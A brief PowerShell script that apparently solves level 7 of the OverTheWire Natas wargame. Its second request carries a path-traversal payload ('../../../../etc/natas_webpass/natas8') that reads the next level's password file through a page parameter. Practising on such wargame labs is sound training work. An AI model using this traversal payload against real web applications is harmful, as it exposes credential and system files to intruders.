
$currentLevel = 7
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$page = Invoke-WebRequest $currentURL -Credential $credential -SessionVariable session
$page.Rawcontent

$currentLevel = 7
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$page = Invoke-WebRequest $currentURL -Credential $credential -SessionVariable session
$page.Rawcontent


